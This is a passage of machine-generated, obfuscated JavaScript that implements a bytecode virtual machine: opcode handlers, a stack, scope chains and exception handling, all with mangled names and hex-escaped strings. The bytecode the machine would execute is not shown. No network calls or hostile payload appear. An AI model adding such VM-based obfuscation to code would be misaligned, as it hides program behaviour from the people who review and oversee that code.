                                    while (!![]) {
                                        let xp = xE(),
                                            xX = D(xE, xp),
                                            xw = xE();
                                        if (typeof xw !== 'function')
                                            throw new TypeError(
                                                xw + '\x20is\x20not\x20a\x20constructor'
                                            );
                                        if (R['has'](xw))
                                            throw new TypeError(
                                                xw['name'] + '\x20is\x20not\x20a\x20constructor'
                                            );
                                        let xW = vmy_6c9c4d['_$nqVw0B'];
                                        vmy_6c9c4d['_$nqVw0B'] = undefined;
                                        let xs;
                                        try {
                                            xs = Reflect['construct'](xw, xX);
                                        } finally {
                                            vmy_6c9c4d['_$nqVw0B'] = xW;
                                        }
                                        (xR(xs), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE(),
                                            xw = xD(),
                                            xW = o(xw);
                                        (vmD(xW, xX, {
                                            set: xp,
                                            enumerable: xW === xw,
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        (xR(A[xA]), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = O[xA] - 0x1;
                                        ((O[xA] = xp), xR(xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE();
                                        (xR(xX ^ xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE();
                                        (xR(xX - xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE();
                                        if (xX === null || xX === undefined)
                                            throw new TypeError(
                                                'Cannot\x20read\x20property\x20\x27' +
                                                    String(xp) +
                                                    '\x27\x20of\x20' +
                                                    xX
                                            );
                                        (xR(xX[xp]), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE();
                                        (xR(xX / xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE();
                                        (xR(xX | xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xA & 0xffff,
                                            xX = xA >>> 0x10,
                                            xw = O[xp],
                                            xW = l[xX];
                                        (xR(xw[xW]), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE(),
                                            xw = l[xA],
                                            xW = h();
                                        !xW['has'](xw) && xW['set'](xw, new WeakMap());
                                        let xs = xW['get'](xw);
                                        if (xs['has'](xX))
                                            throw new TypeError(
                                                'Cannot\x20initialize\x20' +
                                                    xw +
                                                    '\x20twice\x20on\x20the\x20same\x20object'
                                            );
                                        (xs['set'](xX, xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xp['next']();
                                        (xR(Promise['resolve'](xX)), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        ((O[xA] = O[xA] + 0x1), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE();
                                        (xR(typeof xp === 'bigint' ? xp + 0x1n : +xp + 0x1), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xA & 0xffff,
                                            xX = xA >>> 0x10,
                                            xw = xE(),
                                            xW = D(xE, xw),
                                            xs = O[xp],
                                            xY = l[xX],
                                            xO = xs[xY];
                                        (xR(xO['apply'](xs, xW)), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE(),
                                            xw = l[xA];
                                        if (xX === null || xX === undefined)
                                            throw new TypeError(
                                                'Cannot\x20set\x20property\x20\x27' +
                                                    String(xw) +
                                                    '\x27\x20of\x20' +
                                                    xX
                                            );
                                        (f(xX, xw, xp, xI), xR(xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xD(),
                                            xw = l[xA];
                                        (vmD(xX, xw, {
                                            set: xp,
                                            enumerable: ![],
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE(),
                                            xw = xE(),
                                            xW = B(xw),
                                            xs = z(xW, xX);
                                        xs['desc'] && xs['desc']['set']
                                            ? xs['desc']['set']['call'](xw, xp)
                                            : (xw[xX] = xp);
                                        (xR(xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        !xE() ? (c = xB(x1[c])) : c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = l[xA],
                                            xw = ![],
                                            xW = I();
                                        if (xW) {
                                            let xs = xW['get'](xX);
                                            xs && xs['has'](xp) && (xw = !![]);
                                        }
                                        (xR(xw), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        if (xA === -0x1) xR(Symbol());
                                        else {
                                            let xp = xE();
                                            xR(Symbol(xp));
                                        }
                                        c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xD();
                                        (xX['push'](xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE();
                                        (xR(xX in xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        if (x8['_$csazO3']) {
                                            let xp = x8['_$VmqNsa'];
                                            ((x8['_$csazO3'] = ![]),
                                                (x8['_$VmqNsa'] = undefined),
                                                (xf = !![]),
                                                (xh = xp));
                                            return;
                                        }
                                        if (x9['_$Mn6sWY']) {
                                            let xX = x9['_$2fOqlh'];
                                            ((x9['_$Mn6sWY'] = ![]),
                                                (x9['_$2fOqlh'] = 0x0),
                                                (c = xX));
                                            break;
                                        }
                                        if (xx['_$8bHCYf']) {
                                            let xw = xx['_$vsoyHz'];
                                            ((xx['_$8bHCYf'] = ![]),
                                                (xx['_$vsoyHz'] = 0x0),
                                                (c = xw));
                                            break;
                                        }
                                        if (x7 !== null) {
                                            let xW = x7;
                                            x7 = null;
                                            throw xW;
                                        }
                                        c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = l[xA];
                                        if (xp === '__this__') {
                                            let xO = xn;
                                            while (xO) {
                                                if (xO['_$0SKFtw'] && '__this__' in xO['_$0SKFtw'])
                                                    throw new ReferenceError(
                                                        'Cannot\x20access\x20\x27__this__\x27\x20before\x20initialization'
                                                    );
                                                if (xO['_$3NkOio'] && '__this__' in xO['_$3NkOio'])
                                                    break;
                                                xO = xO['_$lQV5eu'];
                                            }
                                            (xR(W), c++);
                                            break;
                                        }
                                        let xX = xn,
                                            xw,
                                            xW = ![],
                                            xs = xp['indexOf']('$$'),
                                            xY = xs !== -0x1 ? xp['substring'](0x0, xs) : null;
                                        while (xX) {
                                            if (xX['_$0SKFtw'] && xp in xX['_$0SKFtw'])
                                                throw new ReferenceError(
                                                    'Cannot\x20access\x20\x27' +
                                                        xp +
                                                        '\x27\x20before\x20initialization'
                                                );
                                            if (xY && xX['_$0SKFtw'] && xY in xX['_$0SKFtw']) {
                                                if (!(xX['_$3NkOio'] && xp in xX['_$3NkOio']))
                                                    throw new ReferenceError(
                                                        'Cannot\x20access\x20\x27' +
                                                            xY +
                                                            '\x27\x20before\x20initialization'
                                                    );
                                            }
                                            if (xX['_$3NkOio'] && xp in xX['_$3NkOio']) {
                                                ((xw = xX['_$3NkOio'][xp]), (xW = !![]));
                                                break;
                                            }
                                            xX = xX['_$lQV5eu'];
                                        }
                                        !xW &&
                                            (xp in vmy_6c9c4d
                                                ? (xw = vmy_6c9c4d[xp])
                                                : (xw = vmV[xp]));
                                        (xR(xw), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        xE() ? (c = xB(x1[c])) : c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE();
                                        (xR(xX * xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE();
                                        (xR(typeof xp === 'bigint' ? xp - 0x1n : +xp - 0x1), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = l[xA];
                                        if (xp == null) {
                                            (xR(undefined), c++);
                                            break;
                                        }
                                        let xw = h(),
                                            xW = xw['get'](xX);
                                        if (!xW || !xW['has'](xp))
                                            throw new TypeError(
                                                'Cannot\x20read\x20private\x20member\x20' +
                                                    xX +
                                                    '\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it'
                                            );
                                        (xR(xW['get'](xp)), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE(),
                                            xw = xD();
                                        (vmD(xw['prototype'], xX, {
                                            value: xp,
                                            writable: !![],
                                            enumerable: ![],
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        throw xE();
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        (xR(xn), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE();
                                        (xR(xX + xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xE();
                                        (xR(xX < xp), c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = l[xA];
                                        xp === null || xp === undefined
                                            ? xR(undefined)
                                            : xR(xp[xX]);
                                        c++;
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xD();
                                        (xp['length']++, c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE(),
                                            xX = xD(),
                                            xw = l[xA];
                                        (vmD(xX, xw, {
                                            get: xp,
                                            enumerable: ![],
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xA) {
                                    while (!![]) {
                                        let xp = xE();
                                        (xR(Symbol['keyFor'](xp)), c++);
                                        break;
                                    }
                                },
                            ];
                    ((xI = xU),
                        (xi = xG),
                        (xK = xk),
                        (xa = xH),
                        (xt = xj),
                        (xm = xb),
                        (xd = xL),
                        (xn = xz),
                        xJ[xg[xP]](xS),
                        (xz = xn),
                        (xj = xt));
                    if (xf) return ((xf = ![]), xh);
                }
                break;
            } catch (xA) {
                if (x6['length'] > 0x0) {
                    let xp = x6[x6['length'] - 0x1];
                    Y = xp['_$KMG5He'];
                    if (xp['_$xhxcOJ'] !== undefined)
                        (xR(xA),
                            (c = xp['_$xhxcOJ']),
                            (xp['_$xhxcOJ'] = undefined),
                            xp['_$Vdn9lU'] === undefined && x6['pop']());
                    else
                        xp['_$Vdn9lU'] !== undefined
                            ? ((c = xp['_$Vdn9lU']), (xp['_$SGa8YC'] = xA))
                            : ((c = xp['_$2AXo24']), x6['pop']());
                    continue;
                }
                throw xA;
            }
        }
        return Y > 0x0 ? xE() : xj ? W : undefined;
    }
    function* Z(S, A, p, X, w, W) {
        let s = [],
            Y = 0x0,
            O = new Array((S['p'] || 0x0) + (S['l'] || 0x0)),
            c = 0x0,
            l = S['c'],
            x0 = S['i'],
            x1 = S['j'] || {},
            x2 = S['x'] || {},
            x3 = x0['length'] >> 0x1,
            x4 = (xN) => xN << 0x1,
            x5 = (xN) => (xN << 0x1) + 0x1,
            x6 = [],
            x7 = null,
            x8 = { ['_$csazO3']: ![], ['_$VmqNsa']: undefined },
            x9 = { ['_$Mn6sWY']: ![], ['_$2fOqlh']: 0x0 },
            xx = { ['_$8bHCYf']: ![], ['_$vsoyHz']: 0x0 },
            xu = S['o'] || U,
            xU = !!S['st'],
            xG = !!S['sp'],
            xk = !!S['dc'],
            xH = !!S['nte'],
            xb = W,
            xq = !!S['a'];
        !xU && !xq && (W === undefined || W === null) && (W = vmV);
        var xy = 0x0,
            xF = null,
            xM = null;
        let xV = S['seKey'],
            xR,
            xE,
            xD,
            xC,
            xv,
            xo;
        if (xV !== undefined) {
            let xN = (xQ) =>
                typeof xQ === 'number' &&
                Number['isFinite'](xQ) &&
                Number['isInteger'](xQ) &&
                xQ >= -0x80000000 &&
                xQ <= 0x7fffffff &&
                !Object['is'](xQ, -0x0)
                    ? (xQ ^ xV) | 0x0
                    : xQ;
            ((xR = (xQ) => {
                s[Y++] = xN(xQ);
            }),
                (xE = () => xN(s[--Y])),
                (xD = () => xN(s[Y - 0x1])),
                (xC = (xQ) => {
                    s[Y - 0x1] = xN(xQ);
                }),
                (xv = (xQ) => xN(s[Y - xQ])),
                (xo = (xQ, xZ) => {
                    s[Y - xQ] = xN(xZ);
                }));
        } else
            ((xR = (xQ) => {
                s[Y++] = xQ;
            }),
                (xE = () => s[--Y]),
                (xD = () => s[Y - 0x1]),
                (xC = (xQ) => {
                    s[Y - 0x1] = xQ;
                }),
                (xv = (xQ) => s[Y - xQ]),
                (xo = (xQ, xZ) => {
                    s[Y - xQ] = xZ;
                }));
        let xB = (xQ) => xQ,
            xz = { ['_$lQV5eu']: p, ['_$3NkOio']: vmC(null) };
        if (A)
            for (let xQ = 0x0; xQ < Math['min'](A['length'], S['p'] || 0x0); xQ++) {
                O[xQ] = A[xQ];
            }
        let xL = xU && A ? v(A) : null,
            xe = null,
            xj = ![];
        xH &&
            (!xz['_$0SKFtw'] && (xz['_$0SKFtw'] = vmC(null)), (xz['_$0SKFtw']['__this__'] = !![]));
        i(S, xz, X);
        while (c < x3) {
            try {
                while (c < x3) {
                    let xZ = x0[x4(c)],
                        xP = xZ,
                        xr = xu[xP],
                        xT = x0[x5(c)],
                        xS = xT === null ? undefined : xT;
                    if (xP === M) {
                        let xA = xE(),
                            xp = yield { ['_$zhPVt2']: k, ['_$ZARUn1']: xA };
                        (xR(xp), c++);
                        continue;
                    }
                    if (xP === y) {
                        let xX = xE(),
                            xw = yield { ['_$zhPVt2']: H, ['_$ZARUn1']: xX };
                        if (xw && typeof xw === 'object' && xw['_$zhPVt2'] === q) {
                            let xW = xw['_$ZARUn1'];
                            if (x6['length'] > 0x0) {
                                let xs = x6[x6['length'] - 0x1];
                                if (xs['_$Vdn9lU'] !== undefined) {
                                    ((x8['_$csazO3'] = !![]),
                                        (x8['_$VmqNsa'] = xW),
                                        (c = xs['_$Vdn9lU']));
                                    continue;
                                }
                            }
                            return xW;
                        }
                        (xR(xw), c++);
                        continue;
                    }
                    if (xP === F) {
                        let xY = xE(),
                            xO = yield { ['_$zhPVt2']: b, ['_$ZARUn1']: xY };
                        (xR(xO), c++);
                        continue;
                    }
                    if (typeof xJ === 'undefined')
                        var xf = ![],
                            xh,
                            xI = ![],
                            xi = ![],
                            xK = ![],
                            xa = ![],
                            xt = ![],
                            xm = undefined,
                            xd = null,
                            xn = null,
                            xg = {
                                0x0: 0x26,
                                0x1: 0x14,
                                0x2: 0x43,
                                0x3: 0x10,
                                0x4: 0x5a,
                                0x5: 0x59,
                                0x6: 0x4d,
                                0x7: 0x64,
                                0x8: 0x70,
                                0x9: 0x6,
                                0xa: 0x8e,
                                0xb: 0x73,
                                0xc: 0x88,
                                0xd: 0x75,
                                0xe: 0x55,
                                0xf: 0x48,
                                0x10: 0x7b,
                                0x11: 0x89,
                                0x12: 0x2c,
                                0x13: 0x62,
                                0x14: 0x12,
                                0x15: 0x76,
                                0x16: 0x72,
                                0x17: 0x5c,
                                0x18: 0x30,
                                0x19: 0x18,
                                0x1a: 0x2f,
                                0x1b: 0x22,
                                0x1c: 0x60,
                                0x20: 0x31,
                                0x28: 0x32,
                                0x29: 0x2b,
                                0x2a: 0x6a,
                                0x2b: 0x6b,
                                0x2c: 0x8f,
                                0x2d: 0x4a,
                                0x2e: 0x40,
                                0x2f: 0x36,
                                0x32: 0x29,
                                0x33: 0x87,
                                0x34: 0x80,
                                0x35: 0x3a,
                                0x36: 0x2,
                                0x37: 0x49,
                                0x38: 0x5f,
                                0x39: 0x8c,
                                0x3a: 0x16,
                                0x3b: 0x46,
                                0x3c: 0x20,
                                0x3d: 0x1a,
                                0x3e: 0x85,
                                0x3f: 0x57,
                                0x40: 0xf,
                                0x46: 0x1c,
                                0x47: 0x7d,
                                0x48: 0x74,
                                0x49: 0x5d,
                                0x4a: 0x5e,
                                0x4b: 0x33,
                                0x4c: 0x2a,
                                0x4d: 0x61,
                                0x4e: 0x90,
                                0x4f: 0x84,
                                0x51: 0x54,
                                0x52: 0x42,
                                0x53: 0x58,
                                0x54: 0x2d,
                                0x5a: 0x23,
                                0x5b: 0x83,
                                0x5d: 0x17,
                                0x5e: 0x21,
                                0x5f: 0x91,
                                0x64: 0x34,
                                0x68: 0x6e,
                                0x69: 0x27,
                                0x6a: 0x1b,
                                0x6e: 0x52,
                                0x6f: 0x50,
                                0x70: 0x9,
                                0x7b: 0x41,
                                0x7c: 0x25,
                                0x7f: 0x3d,
                                0x80: 0x63,
                                0x81: 0x4b,
                                0x82: 0x79,
                                0x83: 0x8,
                                0x84: 0x51,
                                0x8c: 0x24,
                                0x8d: 0x65,
                                0x8e: 0x45,
                                0x8f: 0x7f,
                                0x90: 0x3e,
                                0x91: 0x2e,
                                0x92: 0xc,
                                0x93: 0x68,
                                0x94: 0x92,
                                0x95: 0x7e,
                                0x96: 0x39,
                                0x97: 0x3c,
                                0x98: 0x78,
                                0x99: 0x81,
                                0x9a: 0xd,
                                0x9b: 0x8a,
                                0x9c: 0x4f,
                                0x9d: 0x1e,
                                0x9e: 0x1d,
                                0xa0: 0x28,
                                0xa1: 0x1f,
                                0xa2: 0x35,
                                0xa3: 0x66,
                                0xa4: 0x13,
                                0xa5: 0x37,
                                0xa6: 0x0,
                                0xa7: 0x82,
                                0xa8: 0x53,
                                0xa9: 0x93,
                                0xb4: 0x8b,
                                0xb5: 0x69,
                                0xb6: 0x4,
                                0xb7: 0x6f,
                                0xb8: 0x56,
                                0xb9: 0x7,
                                0xc8: 0x67,
                                0xc9: 0x5b,
                                0xca: 0xa,
                                0xd2: 0x6d,
                                0xd3: 0x86,
                                0xd4: 0x11,
                                0xd5: 0x8d,
                                0xd6: 0xe,
                                0xd7: 0x1,
                                0xd8: 0x47,
                                0xd9: 0x5,
                                0xda: 0x15,
                                0xdb: 0x4c,
                                0xdc: 0x3,
                                0xfa: 0x7a,
                                0xfb: 0x38,
                                0xfc: 0xb,
                                0xfd: 0x4e,
                                0xfe: 0x19,
                                0xff: 0x77,
                                0x100: 0x3b,
                                0x101: 0x6c,
                                0x102: 0x7c,
                                0x103: 0x3f,
                                0x104: 0x44,
                                0x105: 0x71,
                            },
                            xJ = [
                                function (xc) {
                                    while (!![]) {
                                        (xR(vmE[xc]), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = l[xc],
                                            u0 = xE();
                                        (L(xn, xl), (xn['_$3NkOio'][xl] = u0), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE(),
                                            u1 = vmy_6c9c4d['_$nqVw0B'];
                                        vmy_6c9c4d['_$nqVw0B'] = undefined;
                                        try {
                                            let u2 = u0['apply'](undefined, D(xE, xl));
                                            xR(u2);
                                        } finally {
                                            vmy_6c9c4d['_$nqVw0B'] = u1;
                                        }
                                        c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = l[xc];
                                        if (xI && !(u0 in vmV) && !(u0 in vmy_6c9c4d))
                                            throw new ReferenceError(
                                                u0 + '\x20is\x20not\x20defined'
                                            );
                                        ((vmy_6c9c4d[u0] = xl), (vmV[u0] = xl), xR(xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE(),
                                            u1 = xD(),
                                            u2 = o(u1);
                                        (vmD(u2, u0, {
                                            get: xl,
                                            enumerable: u2 === u1,
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = l[xc],
                                            u0 = xE();
                                        (L(xn, xl), (xn['_$3NkOio'][xl] = u0));
                                        !xn['_$NJY3Sg'] && (xn['_$NJY3Sg'] = {});
                                        ((xn['_$NJY3Sg'][xl] = !![]), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        ((A[xc] = xE()), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE(),
                                            u1 = xD();
                                        (vmD(u1, u0, {
                                            set: xl,
                                            enumerable: ![],
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE();
                                        xl && typeof xl['return'] === 'function'
                                            ? xR(Promise['resolve'](xl['return']()))
                                            : xR(Promise['resolve']());
                                        c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = l[xc];
                                        xl in vmy_6c9c4d
                                            ? xR(typeof vmy_6c9c4d[xl])
                                            : xR(typeof vmV[xl]);
                                        c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        ((xf = !![]), (xh = Y > 0x0 ? xE() : undefined));
                                        return;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xc & 0xffff,
                                            u0 = xc >>> 0x10;
                                        (xR(O[xl] + l[u0]), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xD(),
                                            u1 = l[xc],
                                            u2 = o(u0);
                                        (vmD(u2, u1, {
                                            set: xl,
                                            enumerable: u2 === u0,
                                            configurable: !![],
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE(),
                                            u1 = l[xc],
                                            u2 = null,
                                            u3 = I();
                                        if (u3) {
                                            let u6 = u3['get'](u1);
                                            u6 && u6['has'](u0) && (u2 = u6['get'](u0));
                                        }
                                        if (u2 === null) {
                                            let u7 = a(u1);
                                            u7 in u0 && (u2 = u0[u7]);
                                        }
                                        if (u2 === null)
                                            throw new TypeError(
                                                'Cannot\x20read\x20private\x20member\x20' +
                                                    u1 +
                                                    '\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it'
                                            );
                                        if (typeof u2 !== 'function')
                                            throw new TypeError(
                                                u1 + '\x20is\x20not\x20a\x20function'
                                            );
                                        let u4 = D(xE, xl),
                                            u5 = u2['apply'](u0, u4);
                                        (xR(u5), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        xn && xn['_$lQV5eu'] && (xn = xn['_$lQV5eu']);
                                        c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xB(x1[c]);
                                        if (x6['length'] > 0x0) {
                                            let u0 = x6[x6['length'] - 0x1];
                                            if (
                                                u0['_$Vdn9lU'] !== undefined &&
                                                xl >= u0['_$2AXo24']
                                            ) {
                                                ((xx['_$8bHCYf'] = !![]),
                                                    (xx['_$vsoyHz'] = xl),
                                                    (c = u0['_$Vdn9lU']));
                                                break;
                                            }
                                        }
                                        c = xl;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        (xE(), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = l[xc],
                                            u0 = xE(),
                                            u1 = xn,
                                            u2 = ![];
                                        while (u1) {
                                            if (u1['_$0SKFtw'] && xl in u1['_$0SKFtw'])
                                                throw new ReferenceError(
                                                    'Cannot\x20access\x20\x27' +
                                                        xl +
                                                        '\x27\x20before\x20initialization'
                                                );
                                            if (u1['_$3NkOio'] && xl in u1['_$3NkOio']) {
                                                if (u1['_$RWHr5N'] && xl in u1['_$RWHr5N']) {
                                                    if (xI)
                                                        throw new TypeError(
                                                            'Assignment\x20to\x20constant\x20variable.'
                                                        );
                                                    u2 = !![];
                                                    break;
                                                }
                                                if (u1['_$NJY3Sg'] && xl in u1['_$NJY3Sg'])
                                                    throw new TypeError(
                                                        'Assignment\x20to\x20constant\x20variable.'
                                                    );
                                                ((u1['_$3NkOio'][xl] = u0), (u2 = !![]));
                                                break;
                                            }
                                            u1 = u1['_$lQV5eu'];
                                        }
                                        if (!u2) {
                                            if (xl in vmy_6c9c4d) vmy_6c9c4d[xl] = u0;
                                            else xl in vmV ? (vmV[xl] = u0) : (vmV[xl] = u0);
                                        }
                                        c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE();
                                        (xR(u0 & xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        (xR(w), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        (xR(undefined), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = l[xc];
                                        !xn['_$0SKFtw'] && (xn['_$0SKFtw'] = {});
                                        ((xn['_$0SKFtw'][xl] = !![]), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = x2[c];
                                        (x6['push']({
                                            ['_$xhxcOJ']: xl[0x0] >= 0x0 ? xB(xl[0x0]) : undefined,
                                            ['_$Vdn9lU']: xl[0x1] >= 0x0 ? xB(xl[0x1]) : undefined,
                                            ['_$2AXo24']: xl[0x2] >= 0x0 ? xB(xl[0x2]) : undefined,
                                            ['_$KMG5He']: Y,
                                        }),
                                            c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = { value: xl };
                                        (V['add'](u0), xR(u0), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE();
                                        (xR(u0 >> xl), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xc & 0xffff,
                                            u0 = xc >>> 0x10;
                                        (xR(O[xl] * l[u0]), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        if (x6['length'] > 0x0) {
                                            let xl = x6[x6['length'] - 0x1];
                                            xl['_$Vdn9lU'] === c &&
                                                (xl['_$SGa8YC'] !== undefined &&
                                                    (x7 = xl['_$SGa8YC']),
                                                x6['pop']());
                                        }
                                        c++;
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE();
                                        (xR(import(xl)), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = l[xc];
                                        if (xl === null || xl === undefined)
                                            throw new TypeError(
                                                'Cannot\x20read\x20property\x20\x27' +
                                                    String(u0) +
                                                    '\x27\x20of\x20' +
                                                    xl
                                            );
                                        (xR(xl[u0]), c++);
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = xE(),
                                            u1 = l[xc],
                                            u2 = I();
                                        if (u2) {
                                            let u5 = 'set_' + u1,
                                                u6 = u2['get'](u5);
                                            if (u6 && u6['has'](u0)) {
                                                let u8 = u6['get'](u0);
                                                (u8['call'](u0, xl), xR(xl), c++);
                                                break;
                                            }
                                            let u7 = u2['get'](u1);
                                            if (u7 && u7['has'](u0)) {
                                                (u7['set'](u0, xl), xR(xl), c++);
                                                break;
                                            }
                                        }
                                        let u3 =
                                            '_$d9i5Pn' + 'set_' + u1['substring'](0x1) + '_$TYH1Y4';
                                        if (u3 in u0) {
                                            let u9 = u0[u3];
                                            (u9['call'](u0, xl), xR(xl), c++);
                                            break;
                                        }
                                        let u4 = K(u1);
                                        if (u4 in u0) {
                                            ((u0[u4] = xl), xR(xl), c++);
                                            break;
                                        }
                                        throw new TypeError(
                                            'Cannot\x20write\x20private\x20member\x20' +
                                                u1 +
                                                '\x20to\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it'
                                        );
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        let xl = xE(),
                                            u0 = l[xc],
                                            u1 = I();
                                        if (u1) {
                                            let u4 = 'get_' + u0,
                                                u5 = u1['get'](u4);
                                            if (u5 && u5['has'](xl)) {
                                                let u7 = u5['get'](xl);
                                                (xR(u7['call'](xl)), c++);
                                                break;
                                            }
                                            let u6 = u1['get'](u0);
                                            if (u6 && u6['has'](xl)) {
                                                (xR(u6['get'](xl)), c++);
                                                break;
                                            }
                                        }
                                        let u2 =
                                            '_$d9i5Pn' + 'get_' + u0['substring'](0x1) + '_$TYH1Y4';
                                        if (u2 in xl) {
                                            let u8 = xl[u2];
                                            (xR(u8['call'](xl)), c++);
                                            break;
                                        }
                                        let u3 = K(u0);
                                        if (u3 in xl) {
                                            (xR(xl[u3]), c++);
                                            break;
                                        }
                                        throw new TypeError(
                                            'Cannot\x20read\x20private\x20member\x20' +
                                                u0 +
                                                '\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it'
                                        );
                                        break;
                                    }
                                },
                                function (xc) {
                                    while (!![]) {
                                        if (xe === null) {
                                            if (xI || !xi) {
                                                xe = [];
                                                let xl = xd || A;
                                                if (xl)
                                                    for (let u0 = 0x0; u0 < xl['length']; u0++) {
                                                        xe[u0] = xl[u0];
                                                    }
                                                if (xI) {
                                                    let u1 = function () {
                                                        throw new TypeError(
